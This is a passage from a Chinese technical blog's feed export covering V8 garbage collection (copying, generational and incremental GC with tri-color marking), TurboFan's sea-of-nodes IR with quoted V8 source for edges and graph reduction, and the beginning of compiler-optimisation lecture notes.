obj.<span class="built_in">size</span>) obj.forwarding = $<span class="built_in">free</span></span><br><span class="line">        $<span class="built_in">free</span> += obj.<span class="built_in">size</span></span><br><span class="line">    <span class="keyword">return</span> obj.forwarding</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先在第2行检查参数obj是不是已经复制完毕了。<br>对于is_pointer_to_heap(obj.forwarding, $to_start)，如果 obj.forwarding 是指向To空间的指针则返回TRUE，如果不是(即非指针或指向From空间的指针)则返回FALSE。<br>在第3行复制对象，在第4行对forwarding指针进行设定。forwarding指针利用的是field1。</p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-31-163100.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-31-163127.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-31-163606.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-31-163619.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-31-163705.png" alt=""></p><h3 id="分代垃圾回收"><a href="#分代垃圾回收" class="headerlink" title="分代垃圾回收"></a>分代垃圾回收</h3><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-09-01-073113.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-09-01-073126.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-09-01-073138.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-09-01-073154.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-09-01-073202.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-09-01-073212.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-09-01-073225.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-09-01-073241.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-09-01-073249.png" alt=""></p><h4 id="Write-Barrier"><a href="#Write-Barrier" class="headerlink" title="Write Barrier"></a>Write Barrier</h4><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-09-01-073311.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-09-01-073319.png" alt=""></p><h3 id="增量式垃圾回收（Incremental-GC）"><a href="#增量式垃圾回收（Incremental-GC）" class="headerlink" title="增量式垃圾回收（Incremental GC）"></a>增量式垃圾回收（Incremental GC）</h3><p>描述增量式垃圾回收的算法时我们有个方便的概念，那就是Edsger W. Dijkstra等人提出的三色标记算法(Tri-color marking)<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-09-01-070255.png" alt=""><br><strong>V8使用每个对象的两个mark-bits和一个标记工作栈来实现标记。两个mark-bits编码三种颜色：白色（00），灰色（10）和黑色（11）。</strong><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-09-01-072039.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-09-01-072221.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-09-01-072306.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-09-01-072343.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-09-01-072508.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-09-01-072740.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-09-01-072949.png" alt=""></p><h4 id="Write-Barrier-1"><a href="#Write-Barrier-1" class="headerlink" title="Write Barrier"></a>Write Barrier</h4><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-09-01-073355.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-09-01-073441.png" alt=""></p><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li>V8 —— 你需要知道的垃圾回收机制<br><a href="https://juejin.im/post/5b398981e51d455e2c33136b" target="_blank" rel="noopener">https://juejin.im/post/5b398981e51d455e2c33136b</a></li><li>解读 V8 GC Log（二）: 堆内外内存的划分与 GC 算法<br><a href="https://yq.aliyun.com/articles/592880?spm=a2c4e.11153959.0.0.abf75fbdaPONjd" target="_blank" rel="noopener">https://yq.aliyun.com/articles/592880?spm=a2c4e.11153959.0.0.abf75fbdaPONjd</a></li><li>垃圾回收的算法和实现</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;基本概念&quot;&gt;&lt;a href=&quot;#基本概念&quot; class=&quot;headerlink&quot; title=&quot;基本概念&quot;&gt;&lt;/a&gt;基本概念&lt;/h2&gt;&lt;h3 id=&quot;对象-头-域&quot;&gt;&lt;a href=&quot;#对象-头-域&quot; class=&quot;headerlink&quot; title=&quot;对象/头/
      
    
    </summary>
    
    
      <category term="浏览器" scheme="http://eternalsakura13.com/categories/%E6%B5%8F%E8%A7%88%E5%99%A8/"/>
    
    
      <category term="v8" scheme="http://eternalsakura13.com/tags/v8/"/>
    
      <category term="GC" scheme="http://eternalsakura13.com/tags/GC/"/>
    
  </entry>
  
  <entry>
    <title>v8 IR连连看</title>
    <link href="http://eternalsakura13.com/2018/08/21/v8_graph/"/>
    <id>http://eternalsakura13.com/2018/08/21/v8_graph/</id>
    <published>2018-08-21T03:45:08.737Z</published>
    <updated>2018-10-22T14:39:55.617Z</updated>
    
    <content type="html"><![CDATA[<h2 id="v8-Graph"><a href="#v8-Graph" class="headerlink" title="v8 Graph"></a>v8 Graph</h2><p>首先说一个结论，v8的graph都是由下往上遍历。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-21-034849.png" alt=""><br>具体举一个例子,从json里随便提取一句<br><code>{&quot;source&quot;:0,&quot;target&quot;:13,&quot;index&quot;:3,&quot;type&quot;:&quot;control&quot;},</code><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-21-035048.png" alt=""></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PrintEdges</span><span class="params">(Node* node)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; node-&gt;InputCount(); i++) &#123;</span><br><span class="line">    Node* input = node-&gt;InputAt(i);</span><br><span class="line">    <span class="keyword">if</span> (input == <span class="literal">nullptr</span>) <span class="keyword">continue</span>;</span><br><span class="line">    PrintEdge(node, i, input);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PrintEdge</span><span class="params">(Node* from, <span class="keyword">int</span> index, Node* to)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (first_edge_) &#123;</span><br><span class="line">    first_edge_ = <span class="literal">false</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    os_ &lt;&lt; <span class="string">",\n"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span>* edge_type = <span class="literal">nullptr</span>;</span><br><span class="line">  <span class="keyword">if</span> (index &lt; NodeProperties::FirstValueIndex(from)) &#123;</span><br><span class="line">    edge_type = <span class="string">"unknown"</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (index &lt; NodeProperties::FirstContextIndex(from)) &#123;</span><br><span class="line">    edge_type = <span class="string">"value"</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (index &lt; NodeProperties::FirstFrameStateIndex(from)) &#123;</span><br><span class="line">    edge_type = <span class="string">"context"</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (index &lt; NodeProperties::FirstEffectIndex(from)) &#123;</span><br><span class="line">    edge_type = <span class="string">"frame-state"</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (index &lt; NodeProperties::FirstControlIndex(from)) &#123;</span><br><span class="line">    edge_type = <span class="string">"effect"</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    edge_type = <span class="string">"control"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  os_ &lt;&lt; <span class="string">"&#123;\"source\":"</span> &lt;&lt; SafeId(to) &lt;&lt; <span class="string">",\"target\":"</span> &lt;&lt; SafeId(from)</span><br><span class="line">      &lt;&lt; <span class="string">",\"index\":"</span> &lt;&lt; index &lt;&lt; <span class="string">",\"type\":\""</span> &lt;&lt; edge_type &lt;&lt; <span class="string">"\"&#125;"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>事实上反映到代码里，它是这样的。<br>也就是说,from对应node，input对应to。<br>画图的时候，source即to，target即from。<br><strong>注意这里的from和to到底指谁，在看代码的时候才不会迷失。</strong></p><p>以一个函数为例</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">GraphReducer::ReplaceWithValue</span><span class="params">(Node* node, Node* value, Node* effect,</span></span></span><br><span class="line"><span class="function"><span class="params">                                    Node* control)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (effect == <span class="literal">nullptr</span> &amp;&amp; node-&gt;op()-&gt;EffectInputCount() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    effect = NodeProperties::GetEffectInput(node);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (control == <span class="literal">nullptr</span> &amp;&amp; node-&gt;op()-&gt;ControlInputCount() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    control = NodeProperties::GetControlInput(node);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Requires distinguishing between value, effect and control edges.</span></span><br><span class="line">  <span class="keyword">for</span> (Edge edge : node-&gt;use_edges()) &#123;</span><br><span class="line">    Node* <span class="keyword">const</span> user = edge.from();</span><br><span class="line">    DCHECK(!user-&gt;IsDead());</span><br><span class="line">    <span class="keyword">if</span> (NodeProperties::IsControlEdge(edge)) &#123;</span><br><span class="line">      <span class="keyword">if</span> (user-&gt;opcode() == IrOpcode::kIfSuccess) &#123;</span><br><span class="line">        Replace(user, control);</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (user-&gt;opcode() == IrOpcode::kIfException) &#123;</span><br><span class="line">        DCHECK_NOT_NULL(dead_);</span><br><span class="line">        edge.UpdateTo(dead_);</span><br><span class="line">        Revisit(user);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        DCHECK_NOT_NULL(control);</span><br><span class="line">        edge.UpdateTo(control);</span><br><span class="line">        Revisit(user);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (NodeProperties::IsEffectEdge(edge)) &#123;</span><br><span class="line">      DCHECK_NOT_NULL(effect);</span><br><span class="line">      edge.UpdateTo(effect);</span><br><span class="line">      Revisit(user);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      DCHECK_NOT_NULL(value);</span><br><span class="line">      edge.UpdateTo(value);</span><br><span class="line">      Revisit(user);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>Edge edge : node-&gt;use_edges()<br>use_edges即图中的红色边。绿色边代表的是input，红色边代表use<br>这其实很好理解，如果我们来写一个双向图搜索，在设计的时候，每个节点肯定有进行前后遍历的两条边可以选择，v8也是这么设计的。<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">V8_EXPORT_PRIVATE</span> <span class="title">Node</span> <span class="title">final</span> &#123;</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">InputEdges</span>;</span></span><br><span class="line">    <span class="function"><span class="keyword">inline</span> InputEdges <span class="title">input_edges</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Inputs</span>;</span></span><br><span class="line">    <span class="function"><span class="keyword">inline</span> Inputs <span class="title">inputs</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">UseEdges</span> <span class="title">final</span> &#123;</span></span><br><span class="line">        <span class="keyword">public</span>:</span><br><span class="line">        <span class="keyword">typedef</span> Edge value_type;</span><br><span class="line"></span><br><span class="line">        <span class="class"><span class="keyword">class</span> <span class="title">iterator</span>;</span></span><br><span class="line">        <span class="function"><span class="keyword">inline</span> iterator <span class="title">begin</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line">        <span class="function"><span class="keyword">inline</span> iterator <span class="title">end</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">bool</span> <span class="title">empty</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">explicit</span> <span class="title">UseEdges</span><span class="params">(Node* node)</span> : <span class="title">node_</span><span class="params">(node)</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span>:</span><br><span class="line">        Node* node_;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="function">UseEdges <span class="title">use_edges</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> UseEdges(<span class="keyword">this</span>); &#125;</span><br><span class="line">...</span><br><span class="line">...</span><br></pre></td></tr></table></figure><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-21-035742.png" alt=""></li><li>Node* const user = edge.from();</li></ul><p><strong>还记得每条边的from么？对，就是target，现在知道对应谁了么？上一个和下一个都是相对的概念，只是我们要知道究竟对应的是谁即可</strong></p><ul><li>接下来代码是一个选择分支，我选一个else if分析<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (NodeProperties::IsEffectEdge(edge)) &#123;</span><br><span class="line">    DCHECK_NOT_NULL(effect);</span><br><span class="line">    edge.UpdateTo(effect);</span><br><span class="line">    Revisit(user);</span><br></pre></td></tr></table></figure>首先effect来源于<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (effect == <span class="literal">nullptr</span> &amp;&amp; node-&gt;op()-&gt;EffectInputCount() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">  effect = NodeProperties::GetEffectInput(node);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>这里是取的原来的节点的输入边，假设它就是effect input。<br>那么假设我们现在就是0-&gt;5-&gt;13，0即effect，5即node，13即user<br>edge是5-&gt;13的这条边。<br>然后我们edge.UpdateTo(effect);</li></ul><p><strong>还记得每条边的from么？是的，这个to本来应该是5，这里就是把5-&gt;13变成了0-&gt;13，就移走了原本在这个路径上的这个节点，要注意的是这个移走并不是直接移除，因为它可能在其他路径上还被用到，只是不在这条路径上了，具体的看我贴的源码（fuck the source code…)</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">UpdateTo</span><span class="params">(Node* new_to)</span> </span>&#123;</span><br><span class="line">    Node* old_to = *input_ptr_;</span><br><span class="line">    <span class="keyword">if</span> (old_to != new_to) &#123;</span><br><span class="line">      <span class="keyword">if</span> (old_to) old_to-&gt;RemoveUse(use_);</span><br><span class="line">      *input_ptr_ = new_to;</span><br><span class="line">      <span class="keyword">if</span> (new_to) new_to-&gt;AppendUse(use_);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  ...</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">Node::RemoveUse</span><span class="params">(Use* use)</span> </span>&#123;</span><br><span class="line">  DCHECK(first_use_ == <span class="literal">nullptr</span> || first_use_-&gt;prev == <span class="literal">nullptr</span>);</span><br><span class="line">  <span class="keyword">if</span> (use-&gt;prev) &#123;</span><br><span class="line">    DCHECK_NE(first_use_, use);</span><br><span class="line">    use-&gt;prev-&gt;next = use-&gt;next;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    DCHECK_EQ(first_use_, use);</span><br><span class="line">    first_use_ = use-&gt;next;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (use-&gt;next) &#123;</span><br><span class="line">    use-&gt;next-&gt;prev = use-&gt;prev;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-21-050445.png" alt=""><br>如图有两条红线，通过一个use链链接起来。</p><h2 id="v8-IR"><a href="#v8-IR" class="headerlink" title="v8 IR"></a>v8 IR</h2><h3 id="Sea-of-Nodes"><a href="#Sea-of-Nodes" class="headerlink" title="Sea-of-Nodes"></a>Sea-of-Nodes</h3><p>v8的IR是Sea-of-Nodes，可以说是一种Program Dependence Graph，其宗旨是“在统一的表达形式下，把分析进行彻底”<br>用这样的IR所表达的程序里完全不需要“变量”的概念了，一切都是经过透彻分析后的“值”。各种操作并不操作变量，而是从依赖获取输入值，运算后产生新的值。每个“值”自身会携带足够依赖信息来判明它在怎样的路径上有效，依赖的数据输入是哪些；<br>TurboFan的依赖信息有三种，Control, Data, Effect</p><ul><li>Control Dependence（控制依赖）可以看作是常规控制流图反过来画。不是基本块持有一个线性列表里面装着节点，而是每个节点都记录着自己的控制依赖是谁——要哪个前驱控制节点执行到的时候我才可以执行。</li><li>Data Dependence很简单，就是use-def链，换句话说一个节点的数据输入都是谁。例如说 a + b，这个“+”的数据依赖就是a和b。</li><li>Effect Dependence则记录“副作用的顺序”——主要就是内存操作的顺序。它只记录顺序而不必维护SSA形式的其它特性。</li></ul><p>基于此，v8放宽了operation的执行顺序，由effect edges来管理stateful operations的执行顺序，且保留了控制流图的“骨架”<br>举几个简单的例子<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-23-073626.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-23-073636.png" alt=""></p><h3 id="Iterative-Reduction"><a href="#Iterative-Reduction" class="headerlink" title="Iterative Reduction"></a>Iterative Reduction</h3><p>需要提一下的是v8的reduce，在每次JIT phase结束的时候，都会根据当前的graph进行Reduce<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-23-073734.png" alt=""><br>整个reduce是从代码最后的End节点开始进行DFS,先遍历子节点，然后遍历自己，记录state改变的节点，将其放入revisit栈，在所有节点遍历完后，对这些需要重新遍历的节点revisit.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">GraphReducer::ReduceGraph</span><span class="params">()</span> </span>&#123; ReduceNode(graph()-&gt;<span class="built_in">end</span>()); &#125;</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">GraphReducer::ReduceNode</span><span class="params">(Node* node)</span> </span>&#123;</span><br><span class="line">  DCHECK(stack_.empty());</span><br><span class="line">  DCHECK(revisit_.empty());</span><br><span class="line">  Push(node);</span><br><span class="line">  <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!stack_.empty()) &#123;</span><br><span class="line">      <span class="comment">// Process the node on the top of the stack, potentially pushing more or</span></span><br><span class="line">      <span class="comment">// popping the node off the stack.</span></span><br><span class="line">      ReduceTop();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!revisit_.empty()) &#123;</span><br><span class="line">      <span class="comment">// If the stack becomes empty, revisit any nodes in the revisit queue.</span></span><br><span class="line">      Node* <span class="keyword">const</span> node = revisit_.front();</span><br><span class="line">      revisit_.pop();</span><br><span class="line">      <span class="keyword">if</span> (state_.Get(node) == State::kRevisit) &#123;</span><br><span class="line">        <span class="comment">// state can change while in queue.</span></span><br><span class="line">        Push(node);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">// Run all finalizers.</span></span><br><span class="line">      <span class="keyword">for</span> (Reducer* <span class="keyword">const</span> reducer : reducers_) reducer-&gt;Finalize();</span><br><span class="line"></span><br><span class="line">      <span class="comment">// Check if we have new nodes to revisit.</span></span><br><span class="line">      <span class="keyword">if</span> (revisit_.empty()) <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  DCHECK(revisit_.empty());</span><br><span class="line">  DCHECK(stack_.empty());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">....</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">Reduction reduction = (*i)-&gt;Reduce(node);</span><br></pre></td></tr></table></figure><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-23-075114.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-23-075120.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-23-075125.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-23-075131.png" alt=""></p><h3 id="Lowering-to-Machine"><a href="#Lowering-to-Machine" class="headerlink" title="Lowering to Machine"></a>Lowering to Machine</h3><p>事实上IR的node是随着JIT phase逐层下降接近至Machine的<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-23-075326.png" alt=""><br>一个JSxxx node可能会变成更多个Machine node<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-23-075359.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;v8-Graph&quot;&gt;&lt;a href=&quot;#v8-Graph&quot; class=&quot;headerlink&quot; title=&quot;v8 Graph&quot;&gt;&lt;/a&gt;v8 Graph&lt;/h2&gt;&lt;p&gt;首先说一个结论，v8的graph都是由下往上遍历。&lt;br&gt;&lt;img src=&quot;https:/
      
    
    </summary>
    
    
      <category term="浏览器" scheme="http://eternalsakura13.com/categories/%E6%B5%8F%E8%A7%88%E5%99%A8/"/>
    
    
      <category term="v8" scheme="http://eternalsakura13.com/tags/v8/"/>
    
  </entry>
  
  <entry>
    <title>哈工大编译优化笔记</title>
    <link href="http://eternalsakura13.com/2018/08/08/optimize/"/>
    <id>http://eternalsakura13.com/2018/08/08/optimize/</id>
    <published>2018-08-08T02:16:54.630Z</published>
    <updated>2018-10-22T14:25:51.722Z</updated>
    
    <content type="html"><![CDATA[<h2 id="什么是基本块？"><a href="#什么是基本块？" class="headerlink" title="什么是基本块？"></a>什么是基本块？</h2><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-022106.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-022128.png" alt=""></p><h2 id="什么是流图"><a href="#什么是流图" class="headerlink" title="什么是流图"></a>什么是流图</h2><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-021814.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-022012.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-022026.png" alt=""></p><h2 id="优化的分类"><a href="#优化的分类" class="headerlink" title="优化的分类"></a>优化的分类</h2><ul><li>机器无关优化<ul><li>针对中间代码</li></ul></li><li>局部代码优化<ul><li>单个基本块范围内的优化</li></ul></li><li>全局代码优化<ul><li>多个基本块的优化<h2 id="常用优化方法"><a href="#常用优化方法" class="headerlink" title="常用优化方法"></a>常用优化方法</h2><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-024124.png" alt=""><h3 id="删除公共子表达式"><a href="#删除公共子表达式" class="headerlink" title="删除公共子表达式"></a>删除公共子表达式</h3><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-022222.png" alt=""><br>例子如下，先看B5，对它进行局部和全局公共子表达式消除。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-022339.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-022629.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-022703.png" alt=""><br>再看B6<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-022855.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-022906.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-023040.png" alt=""><br>关键问题，如何自动识别公共子表达式？<h3 id="删除无用代码"><a href="#删除无用代码" class="headerlink" title="删除无用代码"></a>删除无用代码</h3><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-024246.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-024335.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-024416.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-024428.png" alt=""><br>关键问题，如何自动识别无用代码？<h3 id="常量合并"><a href="#常量合并" class="headerlink" title="常量合并"></a>常量合并</h3><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-140909.png" alt=""><h3 id="循环代码外提"><a href="#循环代码外提" class="headerlink" title="循环代码外提"></a>循环代码外提</h3><img 